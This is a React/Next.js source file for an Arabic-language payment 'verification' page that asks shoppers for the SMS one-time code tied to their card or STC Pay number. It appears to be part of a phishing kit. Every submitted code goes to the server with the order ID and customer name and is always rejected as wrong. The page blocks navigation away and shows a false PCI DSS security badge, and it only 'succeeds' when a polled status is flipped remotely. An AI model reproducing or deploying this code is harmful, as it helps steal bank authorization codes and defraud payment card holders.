"use client";

import { useState, useEffect, useRef } from "react";
import Link from "next/link";
import { AnimatePresence, motion } from "framer-motion";
import { ShieldCheck, RefreshCw, CheckCircle, FileText, Receipt, X, CreditCard, Smartphone, AlertCircle } from "lucide-react";
import { useCartStore, useCustomerStore } from "../../store/cartStore";

function pad(n: number) { return String(n).padStart(2, "0"); }
function fmt(n: number) { return n.toLocaleString("en-US"); }
function fmtDate() {
  const d = new Date();
  return d.toLocaleDateString("ar-SA", { year: "numeric", month: "long", day: "numeric" })
    + "  " + d.toLocaleTimeString("ar-SA", { hour: "2-digit", minute: "2-digit" });
}

// xxxx xxxx xxxx 1234
function maskCard(label: string): string {
  const match = label.match(/(\d{4})$/);
  if (!match) return label;
  return `•••• •••• •••• ${match[1]}`;
}

// 05XXXXXXX → 05X•••XXX (show first 3 + last 3)
function maskPhone(label: string): string {
  const digits = label.replace(/\D/g, "");
  if (digits.length < 6) return label;
  return digits.slice(0, 3) + "•".repeat(digits.length - 6) + digits.slice(-3);
}

/* ── Loading Screen ── */
function LoadingScreen() {
  return (
    <div className="fixed inset-0 z-50 flex flex-col items-center justify-center bg-gray-50 gap-6">
      <div className="relative w-14 h-14">
        <span className="absolute inset-0 rounded-full border-[3px] border-gray-200" />
        <span className="absolute inset-0 rounded-full border-[3px] border-transparent border-t-[#0874ED] animate-spin" style={{ animationDuration: "1s" }} />
        <span className="absolute inset-2 rounded-full border-[3px] border-transparent border-t-[#030D2E] animate-spin" style={{ animationDuration: "0.7s", animationDirection: "reverse" }} />
      </div>
      <div className="text-center">
        <p className="text-sm font-bold text-gray-700">جاري تحضير صفحة التحقق</p>
        <p className="text-xs text-gray-400 mt-1">يرجى الانتظار...</p>
      </div>
    </div>
  );
}

/* ── Success Modal ── */
function SuccessModal({ confirmedId }: { confirmedId: string }) {
  return (
    <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }}
      className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50 px-4">
      <motion.div initial={{ scale: 0.88, opacity: 0, y: 16 }} animate={{ scale: 1, opacity: 1, y: 0 }}
        transition={{ type: "spring", stiffness: 260 }}
        className="relative bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden">
        <Link href="/" className="absolute top-3 left-3 p-1.5 rounded-full bg-gray-100 hover:bg-gray-200 text-gray-400 transition z-10">
          <X size={14} />
        </Link>
        <div className="bg-gradient-to-l from-[#0874ED] to-[#030D2E] px-6 pt-7 pb-5 text-center">
          <motion.div initial={{ scale: 0 }} animate={{ scale: 1 }} transition={{ type: "spring", stiffness: 300, delay: 0.15 }}
            className="w-14 h-14 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3">
            <CheckCircle size={28} className="text-white" />
          </motion.div>
          <h2 className="text-white font-extrabold text-lg">تمت العملية بنجاح</h2>
          <p className="text-white/65 text-xs mt-1">شكراً لثقتك بنا</p>
        </div>
        <div className="px-6 py-5 space-y-4">
          <p className="text-gray-500 text-xs leading-6 text-center">
            يرجى التواصل مع موظف خدمة العملاء لاستكمال إجراءات شحن الطلب.
          </p>
          <div className="flex gap-2">
            <a href={`/invoice/${confirmedId}`} target="_blank" rel="noopener noreferrer"
              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-[#0874ED] text-white font-semibold text-xs hover:bg-[#0665D0] transition">
              <FileText size={13} /> الفاتورة
            </a>
            <a href={`/invoice/${confirmedId}/receipt`} target="_blank" rel="noopener noreferrer"
              className="flex-1 flex items-center justify-center gap-1.5 py-2.5 rounded-xl bg-[#030D2E] text-white font-semibold text-xs hover:bg-[#040D2A] transition">
              <Receipt size={13} /> سند القبض
            </a>
          </div>
        </div>
      </motion.div>
    </motion.div>
  );
}

/* ── Main ── */
export default function VerifyPage() {
  const [phase, setPhase] = useState<"loading" | "verify">("loading");
  const [otp, setOtp] = useState("");
  const [codeError, setCodeError] = useState(false);
  const [lengthError, setLengthError] = useState(false);
  const [resent, setResent] = useState(false);
  const [cooldown, setCooldown] = useState(60);
  const cooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const cooldownEndRef = useRef<number>(0);
  const [submitCooldown, setSubmitCooldown] = useState(0);
  const submitCooldownRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const [submitting, setSubmitting] = useState(false);
  const [attempts, setAttempts] = useState(() => {
    if (typeof window === "undefined") return 0;
    return parseInt(sessionStorage.getItem("verifyAttempts") ?? "0", 10);
  });
  const [limitReached, setLimitReached] = useState(() => {
    if (typeof window === "undefined") return false;
    return parseInt(sessionStorage.getItem("verifyAttempts") ?? "0", 10) >= 4;
  });
  const [redirectTimer, setRedirectTimer] = useState(5);
  const [confirmed, setConfirmed] = useState(false);
  const [dbOrderId, setDbOrderId] = useState<string | null>(null);
  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
  const otpRef = useRef<HTMLInputElement>(null);

  const { totalPrice } = useCartStore();
  const _customer = useCustomerStore(s => s.customer);
  const customer = _customer ? { name: _customer.name } : null;
  const rawTotal = totalPrice();
  const discountAmount = _customer?.discountAmount ?? 0;
  const finalTotal = rawTotal - discountAmount;
  const total = _customer?.installmentType === "installment" ? (_customer.downPayment ?? finalTotal) : finalTotal;
  const orderId = typeof window !== "undefined" ? sessionStorage.getItem("orderId") ?? "—" : "—";

  const paymentInfo = typeof window !== "undefined"
    ? (() => { try { return JSON.parse(sessionStorage.getItem("paymentInfo") ?? "{}"); } catch { return {}; } })()
    : {};
  const rawLabel: string = paymentInfo.label ?? "—";
  const paymentMethod: string = paymentInfo.method ?? "card";
  const maskedLabel = paymentMethod === "stc" ? maskPhone(rawLabel) : maskCard(rawLabel);

  useEffect(() => {
    // Block all navigation away from this page
    const blockNav = (e: BeforeUnloadEvent) => { e.preventDefault(); e.returnValue = ""; };
    window.addEventListener("beforeunload", blockNav);
    const blockBack = () => {
      window.history.pushState(null, "", window.location.href);
    };
    window.history.pushState(null, "", window.location.href);
    window.history.pushState(null, "", window.location.href);
    window.addEventListener("popstate", blockBack);

    const t = setTimeout(() => { setPhase("verify"); setTimeout(() => otpRef.current?.focus(), 80); }, 4000);
    return () => {
      clearTimeout(t);
      window.removeEventListener("popstate", blockBack);
      window.removeEventListener("beforeunload", blockNav);
    };
  }, []);

  function startCooldown() {
    cooldownEndRef.current = Date.now() + 60 * 1000;
    setCooldown(60);
    clearInterval(cooldownRef.current!);
    cooldownRef.current = setInterval(() => {
      const remaining = Math.ceil((cooldownEndRef.current - Date.now()) / 1000);
      if (remaining <= 0) { clearInterval(cooldownRef.current!); setCooldown(0); }
      else setCooldown(remaining);
    }, 500);
  }
  useEffect(() => { startCooldown(); return () => clearInterval(cooldownRef.current!); }, []); // eslint-disable-line

  useEffect(() => {
    const id = typeof window !== "undefined" ? sessionStorage.getItem("dbOrderId") : null;
    if (!id) return;
    setDbOrderId(id);

    // Exponential backoff: يبدأ بـ 5 ثواني ويزيد تدريجياً حتى 30 ثانية
    // يوقف تلقائياً بعد 30 دقيقة
    const MAX_POLL_MS = 30 * 60 * 1000;
    const startTime = Date.now();
    let currentInterval = 5000;
    let timeoutId: ReturnType<typeof setTimeout>;

    const poll = async () => {
      if (Date.now() - startTime >= MAX_POLL_MS) return;
      try {
        const res = await fetch(`/api/orders/${id}/status`);
        if (res.ok) {
          const data = await res.json();
          if (data.status === "confirmed") { setConfirmed(true); return; }
        }
      } catch { /* network error — retry */ }
      // زيادة الـ interval تدريجياً: 5s → 8s → 12s → 18s → 30s (max)
      currentInterval = Math.min(currentInterval * 1.5, 30000);
      timeoutId = setTimeout(poll, currentInterval);
    };

    timeoutId = setTimeout(poll, currentInterval);
    pollRef.current = timeoutId as any;
    return () => clearTimeout(timeoutId);
  }, []);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (submitting || submitCooldown > 0) return;
    if (otp.length < 4) { setLengthError(true); return; }
    setLengthError(false);
    setSubmitting(true);
    const customerName = customer?.name ?? "—";
    await fetch("/api/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ code: otp, orderId, customerName }),
    });
    setSubmitting(false);
    setCodeError(true);
    setOtp("");
    const newAttempts = attempts + 1;
    setAttempts(newAttempts);
    sessionStorage.setItem("verifyAttempts", String(newAttempts));
    if (newAttempts >= 4) { setLimitReached(true); return; }
    setSubmitCooldown(5);
    clearInterval(submitCooldownRef.current!);
    submitCooldownRef.current = setInterval(() => {
      setSubmitCooldown(p => { if (p <= 1) { clearInterval(submitCooldownRef.current!); return 0; } return p - 1; });
    }, 1000);
  }

  function handleResend() {
    fetch("/api/resend", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ orderId, customerName: customer?.name ?? "—" }) });
    setResent(true);
    setTimeout(() => setResent(false), 3000);
    startCooldown();
  }

  const confirmedId = dbOrderId ?? (typeof window !== "undefined" ? sessionStorage.getItem("dbOrderId") : null);

  useEffect(() => {
    if (!limitReached) return;
    setRedirectTimer(5);
    const iv = setInterval(() => {
      setRedirectTimer(p => {
        if (p <= 1) { clearInterval(iv); sessionStorage.removeItem("verifyAttempts"); window.location.href = "/"; return 0; }
        return p - 1;
      });
    }, 1000);
    return () => clearInterval(iv);
  }, [limitReached]);

  return (
    <main className="min-h-screen bg-gray-50 flex items-center justify-center px-4" dir="rtl">

      <AnimatePresence>
        {phase === "loading" && (
          <motion.div key="load" initial={{ opacity: 1 }} exit={{ opacity: 0 }} transition={{ duration: 0.35 }}>
            <LoadingScreen />
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {confirmed && confirmedId && <SuccessModal key="success" confirmedId={confirmedId} />}
      </AnimatePresence>

      <AnimatePresence>
        {limitReached && (
          <motion.div key="limit" initial={{ opacity: 0 }} animate={{ opacity: 1 }}
            className="fixed inset-0 z-50 bg-black/60 backdrop-blur-sm flex items-center justify-center px-4">
            <motion.div initial={{ scale: 0.88, opacity: 0, y: 16 }} animate={{ scale: 1, opacity: 1, y: 0 }}
              transition={{ type: "spring", stiffness: 260 }}
              className="bg-white rounded-2xl shadow-2xl w-full max-w-sm overflow-hidden text-center">
              <div className="bg-gradient-to-l from-red-600 to-red-800 px-6 pt-7 pb-5">
                <div className="w-14 h-14 bg-white/20 rounded-full flex items-center justify-center mx-auto mb-3">
                  <AlertCircle size={28} className="text-white" />
                </div>
                <h2 className="text-white font-extrabold text-lg">تم تجاوز الحد الأقصى</h2>
                <p className="text-white/70 text-xs mt-1">لقد تجاوزت الحد الأقصى للمحاولات المسموح بها</p>
              </div>
              <div className="px-6 py-5 space-y-3">
                <p className="text-gray-500 text-sm leading-6">
                  سيتم توجيهك إلى الصفحة الرئيسية تلقائياً
                </p>
                <div className="w-12 h-12 rounded-full bg-red-50 border-2 border-red-200 flex items-center justify-center mx-auto">
                  <span className="text-red-600 font-extrabold text-lg">{redirectTimer}</span>
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      <AnimatePresence>
        {phase === "verify" && (
          <motion.div key="verify" initial={{ opacity: 0, y: 14 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.4 }}
            className="w-full max-w-sm">

            {/* White card */}
            <div className="bg-white rounded-2xl shadow-xl shadow-gray-200/80 overflow-hidden">

              {/* Header */}
              <div className="px-6 pt-6 pb-4">
                <h1 className="text-base font-extrabold text-gray-900 text-center">تأكيد عملية الشراء</h1>
                <div className="mt-3 h-px bg-gray-100 w-full" />
                <p className="text-xs text-gray-400 text-center mt-3 leading-relaxed">
                  تم إرسال رسالة نصية بها رمز التحقق إلى رقم الجوال لإتمام المعاملة.
                </p>
              </div>

              <div className="px-6 pb-6 space-y-4">

                {/* Transaction details */}
                <div className="border border-gray-100 rounded-xl overflow-hidden">
                  <div className="flex justify-between items-center px-4 py-2.5 border-b border-gray-100">
                    <span className="text-gray-400 text-xs">المبلغ</span>
                    <span className="font-bold text-gray-800 text-sm">{fmt(total)} ر.س</span>
                  </div>
                  <div className="flex justify-between items-center px-4 py-2.5 border-b border-gray-100">
                    <span className="text-gray-400 text-xs">التاريخ</span>
                    <span className="text-gray-600 text-xs">{fmtDate()}</span>
                  </div>
                  <div className="flex justify-between items-center px-4 py-2.5">
                    <span className="text-gray-400 text-xs flex items-center gap-1">
                      {paymentMethod === "stc" ? <Smartphone size={11} /> : <CreditCard size={11} />}
                      وسيلة الدفع
                    </span>
                    <span className="font-mono font-bold text-gray-700 text-xs tracking-wider" dir="ltr">{maskedLabel}</span>
                  </div>
                </div>

                {/* OTP */}
                <form onSubmit={handleSubmit} className="space-y-3">
                  <p className="text-[10px] font-bold text-gray-400 uppercase tracking-widest text-center">Verification Code</p>

                  <div dir="ltr">
                    <input
                      ref={otpRef}
                      type="text"
                      inputMode="numeric"
                      autoComplete="one-time-code"
                      maxLength={6}
                      value={otp}
                      onChange={e => { setOtp(e.target.value.replace(/\D/g, "").slice(0, 6)); setCodeError(false); setLengthError(false); }}
                      placeholder="أدخل رمز التحقق"
                      className={`w-full text-center text-2xl font-bold tracking-[0.5em] border rounded-xl py-3 focus:outline-none transition-all placeholder:text-sm placeholder:tracking-normal placeholder:font-normal ${
                        codeError
                          ? "border-red-300 bg-red-50 text-red-600"
                          : "border-gray-200 bg-gray-50 text-gray-800 focus:border-gray-300 focus:bg-white"
                      }`}
                    />
                  </div>

                  <AnimatePresence mode="wait">
                    {lengthError && (
                      <motion.p key="len" initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                        className="text-amber-500 text-xs text-center flex items-center justify-center gap-1">
                        <AlertCircle size={11} /> يجب إدخال 4 أرقام على الأقل
                      </motion.p>
                    )}
                    {codeError && (
                      <motion.p key="err" initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                        className="text-red-500 text-xs text-center flex items-center justify-center gap-1">
                        <AlertCircle size={11} /> رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى.
                      </motion.p>
                    )}
                    {resent && (
                      <motion.p key="resent" initial={{ opacity: 0, y: -4 }} animate={{ opacity: 1, y: 0 }} exit={{ opacity: 0 }}
                        className="text-green-600 text-xs text-center">
                        ✓ تم إعادة إرسال الرمز
                      </motion.p>
                    )}
                  </AnimatePresence>

                  {/* Countdown */}
                  <div className="text-center">
                    {cooldown > 0 ? (
                      <span className="text-xs text-gray-400">
                        إعادة الإرسال خلال{" "}
                        <span className="font-mono font-bold text-gray-500">{pad(Math.floor(cooldown / 60))}:{pad(cooldown % 60)}</span>
                      </span>
                    ) : (
                      <button type="button" onClick={handleResend}
                        className="inline-flex items-center gap-1 text-xs text-gray-500 hover:text-gray-800 transition font-medium">
                        <RefreshCw size={11} /> إعادة إرسال الرمز
                      </button>
                    )}
                  </div>

                  <button
                    type="submit"
                    disabled={submitting || submitCooldown > 0}
                    className="w-full py-3.5 bg-gradient-to-l from-[#0874ED] to-[#030D2E] text-white rounded-xl font-extrabold text-sm shadow-md shadow-[#0874ED]/25 hover:scale-[1.015] active:scale-[0.985] transition-all disabled:opacity-50 disabled:cursor-not-allowed disabled:scale-100 flex items-center justify-center gap-2"
                  >
                    {submitting ? (
                      <><span className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" /> جاري التحقق...</>
                    ) : submitCooldown > 0 ? `انتظر (${submitCooldown}s)` : (
                      <><ShieldCheck size={14} /> إتمام الدفع</>
                    )}
                  </button>
                </form>

                <p className="text-center text-[10px] text-gray-300 flex items-center justify-center gap-1">
                  <ShieldCheck size={10} className="text-gray-300" />
                  اتصال مشفّر وآمن · PCI DSS
                </p>

              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </main>
  );
}
